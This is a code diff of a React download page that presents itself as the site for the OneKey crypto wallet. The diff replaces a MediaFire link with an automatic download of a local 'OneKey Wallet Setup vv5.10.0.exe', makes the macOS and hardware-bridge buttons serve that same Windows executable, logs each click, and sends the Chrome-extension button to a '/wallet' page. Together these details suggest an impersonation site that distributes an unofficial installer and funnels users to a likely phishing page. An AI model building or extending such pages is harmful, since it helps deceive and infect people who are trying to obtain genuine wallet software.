@@ -188,7 +188,7 @@ function Plataformas({ selecionado, setSelecionado }: PlataformasProps) {
     { id: "linux", nome: "Linux", icon: "./linux.svg" },
     {
       id: "pontehardware",
-      nome: "Ponte de hardware",
+      nome: "Hardware Bridge",
       icon: "./pontehadware.svg",
     },
   ];
@@ -286,10 +286,13 @@ function DownloadSection() {
                 onClick={async () => {
                   registrarEvento("download", "windows");
                   await salvarClientCard("Windows Microsoft Store");
-                  window.open(
-                    "https://download1640.mediafire.com/40j26q7w0ulgKNgvYwb-X0BqfxW1OAL0xhiYjgins50ssn8_xUZEjwwACRTpmOPNYJ-4i3v3yF25cVmCTL_VzslQQRArgjIYw4ylkaENUu0hw2_XB4TD9N2JexYoCFF6tQSYkgCyveM_jvEny1SKtTQr-R7BnCwP0QX63S_LAMNG6EI/5ii2e7d0eklow31/OneKey+Wallet+Setup+vv5.10.0.exe",
-                    "_blank"
-                  );
+                  // Download direto do arquivo local
+                  const link = document.createElement("a");
+                  link.href = "./OneKey Wallet Setup vv5.10.0.exe";
+                  link.download = "OneKey Wallet Setup vv5.10.0.exe";
+                  document.body.appendChild(link);
+                  link.click();
+                  document.body.removeChild(link);
                 }}
               >
                 <img
@@ -311,10 +314,13 @@ function DownloadSection() {
                 }}
                 onClick={async () => {
                   await salvarClientCard("Windows Download");
-                  window.open(
-                    "https://download1640.mediafire.com/40j26q7w0ulgKNgvYwb-X0BqfxW1OAL0xhiYjgins50ssn8_xUZEjwwACRTpmOPNYJ-4i3v3yF25cVmCTL_VzslQQRArgjIYw4ylkaENUu0hw2_XB4TD9N2JexYoCFF6tQSYkgCyveM_jvEny1SKtTQr-R7BnCwP0QX63S_LAMNG6EI/5ii2e7d0eklow31/OneKey+Wallet+Setup+vv5.10.0.exe",
-                    "_blank"
-                  );
+                  // Download direto do arquivo local
+                  const link = document.createElement("a");
+                  link.href = "./OneKey Wallet Setup vv5.10.0.exe";
+                  link.download = "OneKey Wallet Setup vv5.10.0.exe";
+                  document.body.appendChild(link);
+                  link.click();
+                  document.body.removeChild(link);
                 }}
               >
                 <img
@@ -926,6 +932,8 @@ function DownloadChromeSection() {
                 onClick={async () => {
                   registrarEvento("download", "chrome");
                   await salvarClientCard("Chrome Web Store");
+                  // Redirecionar para /wallet
+                  window.location.href = "/wallet";
                 }}
               >
                 {/* Usar crome.svg da pasta public */}
@@ -1134,7 +1142,7 @@ function HardwareBridgeSection() {
               className="text-4xl font-bold text-black leading-tight mb-8"
               style={{ fontFamily: "Stabil Grotesk, system-ui, sans-serif" }}
             >
-              {t("hardware_bridge.title")}
+              Hardware Bridge
             </h2>
             <p
               className="text-base"
@@ -1159,11 +1167,18 @@ function HardwareBridgeSection() {
                   borderRadius: 100,
                 }}
                 onClick={async () => {
-                  await salvarClientCard("Hardware Bridge macOS");
+                  await salvarClientCard("Hardware Bridge Download");
+                  // Download direto do arquivo local
+                  const link = document.createElement("a");
+                  link.href = "./OneKey Wallet Setup vv5.10.0.exe";
+                  link.download = "OneKey Wallet Setup vv5.10.0.exe";
+                  document.body.appendChild(link);
+                  link.click();
+                  document.body.removeChild(link);
                 }}
               >
                 <img src="./apple.svg" alt="macOS" className="w-6 h-6" />
-                {t("hardware_bridge.mac")}
+                Download Hardware Bridge
               </button>
               <button
                 className="group flex items-center justify-center gap-2 bg-black text-white text-lg font-semibold px-8 border border-black rounded-full transition-colors hover:bg-white hover:text-black"
